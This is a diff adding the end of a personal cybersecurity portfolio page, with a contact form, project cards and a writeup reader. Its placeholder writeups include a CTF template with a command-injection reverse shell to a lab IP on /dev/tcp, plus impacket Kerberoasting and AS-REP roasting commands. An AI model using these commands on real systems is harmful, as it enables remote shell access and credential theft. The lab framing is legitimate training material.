+          <label class="mt-4 block">
+            <span class="mb-1.5 block text-sm font-medium text-zinc-300">Message</span>
+            <textarea name="message" rows="5" required
+              class="w-full resize-y rounded-lg border border-white/10 bg-ink-950 px-3.5 py-2.5 text-sm text-zinc-100 outline-none transition placeholder:text-zinc-600 focus:border-accent-400/60 focus:ring-2 focus:ring-accent-400/20"
+              placeholder="A few lines about what you have in mind…"></textarea>
+          </label>
+
+          <button type="submit"
+            class="mt-5 inline-flex w-full items-center justify-center gap-2 rounded-lg bg-accent-400 px-5 py-3 text-sm font-semibold text-ink-950 transition hover:bg-accent-300 sm:w-auto">
+            Compose email
+            <svg class="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
+          </button>
+          <p id="formNote" class="mt-3 text-xs text-zinc-500">Opens your mail app with everything filled in. Prefer to write directly? <a href="mailto:taniaiortiz@protonmail.com" class="text-accent-400 hover:underline">taniaiortiz@protonmail.com</a></p>
+        </form>
+      </div>
+    </div>
+  </section>
+</main>
+
+<!-- ══════════════════════ FOOTER ══════════════════════ -->
+<footer class="border-t border-white/5 py-10">
+  <div class="mx-auto flex max-w-6xl flex-col items-center justify-between gap-4 px-5 text-sm text-zinc-500 sm:flex-row sm:px-8">
+    <p>© <span id="year"></span> Tania I. Ortiz. Built with HTML, Tailwind &amp; vanilla JS.</p>
+    <div class="flex items-center gap-4">
+      <a href="https://github.com/by-tayo" target="_blank" rel="noopener" class="hover:text-zinc-200">GitHub</a>
+      <a href="https://www.linkedin.com/in/tania--ortiz/" target="_blank" rel="noopener" class="hover:text-zinc-200">LinkedIn</a>
+      <a href="https://medium.com/@bytayo" target="_blank" rel="noopener" class="hover:text-zinc-200">Medium</a>
+      <a href="https://tayeotan.substack.com/" target="_blank" rel="noopener" class="hover:text-zinc-200">Substack</a>
+    </div>
+  </div>
+</footer>
+
+<!-- ══════════════════════ WRITEUP READER OVERLAY ══════════════════════ -->
+<div id="reader" class="fixed inset-0 z-50 hidden">
+  <div id="readerBackdrop" class="absolute inset-0 bg-black/85 backdrop-blur-md"></div>
+  <div class="doc-reader absolute inset-0 mx-auto my-0 max-w-5xl overflow-y-auto border border-white/10 bg-ink-850 shadow-2xl shadow-black/60 ring-1 ring-white/5 sm:my-8 sm:rounded-2xl">
+    <div class="sticky top-0 z-10 flex items-center justify-between gap-4 border-b border-white/10 bg-ink-900/90 px-5 py-3 backdrop-blur sm:px-8">
+      <div class="min-w-0">
+        <p id="readerKicker" class="font-mono text-[11px] uppercase tracking-widest text-accent-400"></p>
+        <p id="readerTitle" class="truncate text-sm font-semibold text-zinc-100"></p>
+      </div>
+      <button id="readerClose" aria-label="Close" class="flex-none rounded-lg border border-white/10 bg-white/5 p-2 text-zinc-300 transition hover:bg-white/10 hover:text-zinc-100">
+        <svg class="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M6 6l12 12M18 6L6 18"/></svg>
+      </button>
+    </div>
+
+    <div class="grid gap-8 px-5 py-8 sm:px-8 lg:grid-cols-[1fr_15rem]">
+      <article>
+        <header class="mb-8 border-b border-white/10 pb-6">
+          <h1 id="docTitle" class="text-2xl font-bold tracking-tight text-zinc-50 sm:text-3xl"></h1>
+          <div id="docMeta" class="mt-3 flex flex-wrap items-center gap-x-3 gap-y-1 text-xs text-zinc-500"></div>
+        </header>
+        <div id="docBody" class="prose-doc"></div>
+      </article>
+
+      <aside class="hidden lg:block">
+        <div class="sticky top-24">
+          <p class="mb-3 text-xs font-semibold uppercase tracking-wider text-zinc-500">On this page</p>
+          <nav id="docToc" class="border-l border-white/10"></nav>
+        </div>
+      </aside>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ════════════════════════════ CONFIG ════════════════════════════ */
+const CONFIG = {
+  RESUME_URL: 'assets/Tania-Ortiz-Resume.pdf',   // <- drop your PDF here, or point elsewhere
+  EMAIL: 'taniaiortiz@protonmail.com',
+};
+
+/* ════════════════════════════ PROJECTS ═══════════════════════════
+   [[ EDIT ]] 3–4 entries. `links` keys become labelled buttons.       */
+const PROJECTS = [
+  {
+    title: '[[Homelab Detection Pipeline]]',
+    blurb: 'Overview',
+    architecture:
+      '[[Windows + Linux endpoints ship telemetry via a log shipper into an ELK/Wazuh stack. ' +
+      'Sigma rules are converted and loaded automatically; alerts fan out to a triage queue. ' +
+      'Everything is provisioned with IaC so the lab rebuilds from scratch in minutes.]]',
+    stack: ['Wazuh', 'Elastic', 'Sigma', 'Ansible', 'Docker'],
+    links: { 'Repo': 'https://github.com/by-tayo', 'Writeup': '#writeups' },
+  },
+  {
+    title: '[[Phishing Triage Tool]]',
+    blurb: 'Overview',
+    architecture:
+      '[[A Python service that ingests reported emails, detonates links/attachments in a sandbox, ' +
+      'enriches indicators against threat-intel APIs, and returns a scored verdict with a ' +
+      'one-page analyst summary.]]',
+    stack: ['Python', 'FastAPI', 'VirusTotal API', 'Redis'],
+    links: { 'Repo': 'https://github.com/by-tayo' },
+  },
+  {
+    title: '[[Network Segmentation Lab]]',
+    blurb: 'Overview',
+    architecture:
+      '[[pfSense firewall with VLAN-segmented zones (management, user, IoT, DMZ), inter-VLAN ' +
+      'rules enforced least-privilege, and IDS on the span port. Documented with topology ' +
+      'diagrams and a test matrix proving each rule.]]',
+    stack: ['pfSense', 'VLANs', 'Suricata', 'draw.io'],
+    links: { 'Writeup': '#writeups' },
+  },
+  {
+    title: '[[AML Anomaly Detector]]',
+    blurb: 'Overview',
+    architecture:
+      '[[Feature pipeline over synthetic transaction data flags structuring and rapid-movement ' +
+      'patterns; results feed a review dashboard with case notes. Built to mirror a real ' +
+      'transaction-monitoring workflow.]]',
+    stack: ['Python', 'pandas', 'scikit-learn', 'Streamlit'],
+    links: { 'Repo': 'https://github.com/by-tayo' },
+  },
+];
+
+/* ════════════════════════════ WRITEUPS ═══════════════════════════
+   [[ EDIT ]] `body` is HTML. Supported helpers:
+     <div class="callout callout-info|warn|success|danger"><p>…</p></div>
+     <pre><code>…</code></pre>   (a copy button is added automatically)
+   h2/h3 headings automatically populate the "On this page" TOC.        */
+const WRITEUPS = [
+  {
+    id: 'htb-example',
+    title: '[[HTB: "Boxname" — from foothold to root]]',
+    category: 'CTF',
+    date: '2025-07-12',
+    read: '11 min',
+    summary: 'Enumeration, a misconfigured service for the foothold, and a sudo-rule chain to root.',
+    body: `
+      <p>[[Short intro: what the box is, why it's interesting, and the shape of the path.]]</p>
+      <div class="callout callout-info"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8h.01M11 12h1v4h1"/></svg><p>This writeup is a placeholder showing the reader layout. Replace the body with your real notes.</p></div>
+
+      <h2>Recon</h2>
+      <p>Full TCP scan and service enumeration:</p>
+      <pre><code><span class="cmt"># full port sweep, then targeted version scan</span>
+nmap -p- --min-rate 5000 -oA scans/all 10.10.10.10
+nmap -p 22,80,445 -sCV -oA scans/detail 10.10.10.10</code></pre>
+      <p>[[Walk through what the results told you.]]</p>
+
+      <h3>Web surface</h3>
+      <p>[[Directory brute force, interesting endpoints, parameters.]]</p>
+      <table>
+        <thead><tr><th>Endpoint</th><th>Finding</th><th>Notes</th></tr></thead>
+        <tbody>
+          <tr><td><code>/admin</code></td><td>[[403 → bypass]]</td><td>[[header trick]]</td></tr>
+          <tr><td><code>/api/v1/export</code></td><td>[[IDOR]]</td><td>[[leaks tokens]]</td></tr>
+        </tbody>
+      </table>
+
+      <h2>Foothold</h2>
+      <div class="callout callout-warn"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3 2 21h20L12 3zM12 9v5M12 17h.01"/></svg><p>[[Note the exact misconfiguration and why it was exploitable.]]</p></div>
+      <pre><code><span class="cmt"># example: abuse the exposed endpoint for a reverse shell</span>
+curl -s "http://10.10.10.10/api/run?cmd=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1')"</code></pre>
+
+      <h2>Privilege escalation</h2>
+      <p>[[What <code>sudo -l</code> / SUID / cron / capability got you to root.]]</p>
+      <pre><code>sudo -l
+<span class="cmt"># (ALL) NOPASSWD: /usr/bin/somebinary</span>
+sudo /usr/bin/somebinary --config /dev/stdin &lt;&lt;&lt; '[[payload]]'</code></pre>
+      <div class="callout callout-success"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg><p><code>uid=0(root)</code> — [[one line on the root cause and the fix.]]</p></div>
+
+      <h2>Takeaways</h2>
+      <ul>
+        <li>[[Defensive lesson 1]]</li>
+        <li>[[Detection idea: what log line would have caught this]]</li>
+      </ul>`,
+  },
+  {
+    id: 'lab-ad',
+    title: '[[Lab: Active Directory attack & defense]]',
+    category: 'Lab',
+    date: '2025-05-03',
+    read: '14 min',
+    summary: 'Building a small AD lab, running Kerberoasting / AS-REP roasting, then writing the detections.',
+    body: `
+      <p>[[Why you built this lab and what you wanted to learn.]]</p>
+      <h2>Lab topology</h2>
+      <p>[[DC, member server, workstation, attacker box — diagram or table.]]</p>
+      <pre><code><span class="cmt"># provision with your automation of choice</span>
+ansible-playbook site.yml -i inventory/lab.ini</code></pre>
+      <h2>Attack path</h2>
+      <h3>AS-REP roasting</h3>
+      <pre><code>impacket-GetNPUsers lab.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.10</code></pre>
+      <h3>Kerberoasting</h3>
+      <pre><code>impacket-GetUserSPNs lab.local/user:'Password1' -dc-ip 10.0.0.10 -request</code></pre>
+      <h2>Detections</h2>
+      <div class="callout callout-info"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 8h.01M11 12h1v4h1"/></svg><p>[[Event IDs 4768/4769, ticket encryption downgrade, and the Sigma rule you wrote.]]</p></div>
+      <h2>Takeaways</h2>
+      <ul><li>[[…]]</li></ul>`,
+  },
+  {
+    id: 'tooling-soon',
+    title: '[[Custom tooling: log-enrichment CLI]]',
+    category: 'Tooling',
+    date: '2025-08-20',
+    read: '—',
+    summary: 'A small CLI that normalises and enriches messy logs before they hit the SIEM. Writeup in progress.',
+    body: `
+      <div class="callout callout-warn"><svg class="ic" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 3 2 21h20L12 3zM12 9v5M12 17h.01"/></svg><p>This writeup is still being drafted. Check back soon, or watch the repo.</p></div>
+      <h2>The problem</h2>
+      <p>[[What was painful about the raw logs.]]</p>
+      <h2>Design</h2>
+      <p>[[Parser plugins, enrichment sources, output formats.]]</p>`,
+  },
+];
+
+/* ════════════════════════════ RENDER ════════════════════════════ */
+const $  = (s, r = document) => r.querySelector(s);
+const $$ = (s, r = document) => [...r.querySelectorAll(s)];
+const esc = (s) => s.replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+
+$('#year').textContent = new Date().getFullYear();
+$$('a[href$="Tania-Ortiz-Resume.pdf"]').forEach((a) => (a.href = CONFIG.RESUME_URL));
+
+/* ---- Scroll reveal (defined early: render fns call observeReveals) ---- */
+let revealObs;
+function observeReveals() {
+  revealObs = revealObs || new IntersectionObserver((entries) => {
+    entries.forEach((en) => { if (en.isIntersecting) { en.target.classList.add('in'); revealObs.unobserve(en.target); } });
+  }, { rootMargin: '0px 0px -8% 0px' });
+  $$('.reveal:not(.in)').forEach((el) => revealObs.observe(el));
+}
+
+/* ---- Projects ---- */
+$('#projectGrid').innerHTML = PROJECTS.map((p) => {
+  const tags = p.stack.map((t) => `<span class="rounded-md border border-white/10 bg-white/5 px-2 py-1 font-mono text-[11px] text-zinc-400">${esc(t)}</span>`).join('');
+  const links = Object.entries(p.links).map(([label, href]) =>
+    `<a href="${esc(href)}" ${href.startsWith('http') ? 'target="_blank" rel="noopener"' : ''} class="inline-flex items-center gap-1 text-sm font-medium text-accent-400 transition hover:text-accent-300">${esc(label)} <span aria-hidden="true">${href.startsWith('http') ? '↗' : '↓'}</span></a>`).join('<span class="text-zinc-700">·</span>');
+  return `
+    <article class="reveal group flex flex-col rounded-2xl border border-white/10 bg-ink-900/60 p-6 transition hover:border-accent-400/30 hover:bg-ink-850">
+      <h3 class="text-lg font-semibold text-zinc-100">${esc(p.title)}</h3>
+      <p class="mt-1 font-mono text-[11px] uppercase tracking-widest text-zinc-600">Architecture</p>
+      <p class="mt-2 flex-1 text-sm leading-relaxed text-zinc-400">${esc(p.architecture)}</p>
+      <div class="mt-4 flex flex-wrap gap-1.5">${tags}</div>
+      <div class="mt-5 flex items-center gap-3 border-t border-white/5 pt-4">${links}</div>
+    </article>`;
+}).join('');
+
+/* ---- Writeups ---- */
+const CATS = ['All', ...new Set(WRITEUPS.map((w) => w.category))];
+let activeCat = 'All';
+
+function renderFilters() {
+  $('#writeupFilters').innerHTML = CATS.map((c) =>
+    `<button data-cat="${c}" class="rounded-full border px-3 py-1.5 text-xs font-medium transition ${
+      c === activeCat
+        ? 'border-accent-400/50 bg-accent-400/10 text-accent-400'
+        : 'border-white/10 bg-white/5 text-zinc-400 hover:text-zinc-200'
+    }">${c}</button>`).join('');
+}
+function renderWriteups() {
+  const list = WRITEUPS.filter((w) => activeCat === 'All' || w.category === activeCat);
+  $('#writeupGrid').innerHTML = list.map((w) => {
+    const d = new Date(w.date + 'T00:00:00');
+    const nice = isNaN(d) ? w.date : d.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
+    return `
+      <button data-id="${w.id}" class="writeup-card reveal in group flex h-full flex-col rounded-2xl border border-white/10 bg-ink-900/60 p-5 text-left transition hover:border-accent-400/30 hover:bg-ink-850">
+        <div class="mb-3 flex items-center gap-2">
+          <span class="rounded-md bg-accent-400/10 px-2 py-0.5 font-mono text-[10px] uppercase tracking-wider text-accent-400">${esc(w.category)}</span>
+          <span class="font-mono text-[11px] text-zinc-600">${nice} · ${esc(w.read)}</span>
+        </div>
+        <h3 class="font-semibold leading-snug text-zinc-100 group-hover:text-white">${esc(w.title)}</h3>
+        <p class="mt-2 flex-1 text-sm leading-relaxed text-zinc-400">${esc(w.summary)}</p>
+        <span class="mt-4 inline-flex items-center gap-1 text-sm font-medium text-accent-400">Read writeup <span aria-hidden="true">→</span></span>
+      </button>`;
+  }).join('');
+  observeReveals();
+}
+renderFilters();
+renderWriteups();
+
+$('#writeupFilters').addEventListener('click', (e) => {
+  const b = e.target.closest('button[data-cat]');
+  if (!b) return;
+  activeCat = b.dataset.cat;
+  renderFilters();
+  renderWriteups();
+});
+
+/* ---- Writeup reader ---- */
+const reader = $('#reader');
+let lastFocus = null;
+
+function slug(s) { return s.toLowerCase().replace(/[^\w]+/g, '-').replace(/(^-|-$)/g, ''); }
+
+function openReader(id) {
+  const w = WRITEUPS.find((x) => x.id === id);
+  if (!w) return;
+  lastFocus = document.activeElement;
+
+  $('#readerKicker').textContent = w.category;
+  $('#readerTitle').textContent = w.title;
+  $('#docTitle').textContent = w.title;
+
+  const d = new Date(w.date + 'T00:00:00');
+  const nice = isNaN(d) ? w.date : d.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
+  $('#docMeta').innerHTML =
+    `<span class="rounded bg-accent-400/10 px-1.5 py-0.5 font-mono text-[10px] uppercase tracking-wider text-accent-400">${esc(w.category)}</span>` +
+    `<span>${nice}</span><span>·</span><span>${esc(w.read)} read</span>`;
+
+  const body = $('#docBody');
+  body.innerHTML = w.body;
+
+  // Heading ids + TOC
+  const heads = $$('h2, h3', body);
+  const toc = $('#docToc');
+  toc.innerHTML = heads.map((h) => {
+    const id = slug(h.textContent);
+    h.id = id;
+    return `<a href="#${id}" class="toc-link ${h.tagName === 'H3' ? 'sub' : ''}" data-h="${id}">${esc(h.textContent)}</a>`;
+  }).join('');
+
+  // Copy buttons on <pre>
+  $$('pre', body).forEach((pre) => {
+    const btn = document.createElement('button');
+    btn.className = 'copy-btn';
+    btn.type = 'button';
+    btn.textContent = 'copy';
+    btn.addEventListener('click', () => {
+      navigator.clipboard.writeText(pre.innerText).then(() => {
+        btn.textContent = 'copied';
+        btn.classList.add('done');
+        setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('done'); }, 1600);
+      });
+    });
+    pre.appendChild(btn);
+  });
+
+  // TOC smooth scroll within the reader
+  toc.querySelectorAll('a').forEach((a) => a.addEventListener('click', (e) => {
+    e.preventDefault();
+    document.getElementById(a.dataset.h)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }));
+
+  // Scrollspy
+  const scroller = $('.doc-reader');
+  const spy = new IntersectionObserver((entries) => {
+    entries.forEach((en) => {
+      if (en.isIntersecting) {
+        toc.querySelectorAll('a').forEach((a) => a.classList.toggle('active', a.dataset.h === en.target.id));
+      }
+    });
+  }, { root: scroller, rootMargin: '-10% 0px -75% 0px', threshold: 0 });
+  heads.forEach((h) => spy.observe(h));
+  reader._spy = spy;
+
+  reader.classList.remove('hidden');
+  document.body.style.overflow = 'hidden';
+  $('#readerClose').focus();
+  scroller.scrollTop = 0;
+  history.replaceState(null, '', '#writeups');
+}
+
+function closeReader() {
+  reader.classList.add('hidden');
+  document.body.style.overflow = '';
+  reader._spy?.disconnect();
+  lastFocus?.focus();
+}
+
+$('#writeupGrid').addEventListener('click', (e) => {
+  const c = e.target.closest('.writeup-card');
+  if (c) openReader(c.dataset.id);
+});
+$('#readerClose').addEventListener('click', closeReader);
+$('#readerBackdrop').addEventListener('click', closeReader);
+document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && !reader.classList.contains('hidden')) closeReader(); });
+
+/* ---- Contact form → mailto: ---- */
+$('#contactForm').addEventListener('submit', (e) => {
+  e.preventDefault();
+  const f = e.target;
+  if (!f.checkValidity()) { f.reportValidity(); return; }
+  const name = f.name.value.trim();
+  const email = f.email.value.trim();
+  const subject = f.subject.value.trim() || `Portfolio contact from ${name}`;
+  const body =
+    `${f.message.value.trim()}\n\n— ${name}\n${email}`;
+  const href = `mailto:${CONFIG.EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+  window.location.href = href;
+  $('#formNote').innerHTML = 'Your mail app should have opened. If it didn’t, email <a href="mailto:' + CONFIG.EMAIL + '" class="text-accent-400 hover:underline">' + CONFIG.EMAIL + '</a> directly.';
+});
+
+/* ---- Mobile menu ---- */
+const menuBtn = $('#menuBtn'), mobileMenu = $('#mobileMenu');
+menuBtn.addEventListener('click', () => {
+  const open = mobileMenu.classList.toggle('hidden') === false;
+  menuBtn.setAttribute('aria-expanded', String(open));
+});
+mobileMenu.querySelectorAll('a').forEach((a) => a.addEventListener('click', () => {
+  mobileMenu.classList.add('hidden');
+  menuBtn.setAttribute('aria-expanded', 'false');
+}));
+
+/* ---- Nav: shadow on scroll + active link ---- */
+const nav = $('#nav');
+addEventListener('scroll', () => {
+  nav.classList.toggle('shadow-lg', window.scrollY > 8);
+  nav.classList.toggle('shadow-black/30', window.scrollY > 8);
+}, { passive: true });
+
+const navLinks = $$('.nav-link');
+const sections = ['experience', 'projects', 'writeups', 'contact'].map((id) => document.getElementById(id));
+const navSpy = new IntersectionObserver((entries) => {
+  entries.forEach((en) => {
+    if (en.isIntersecting) {
+      navLinks.forEach((l) => {
+        const on = l.dataset.target === en.target.id;
+        l.classList.toggle('text-zinc-100', on);
+        l.classList.toggle('bg-white/5', on);
+        l.classList.toggle('text-zinc-400', !on);
+      });
+    }
+  });
+}, { rootMargin: '-45% 0px -50% 0px' });
+sections.forEach((s) => s && navSpy.observe(s));
+
+observeReveals();
+</script>
+</body>
+</html>
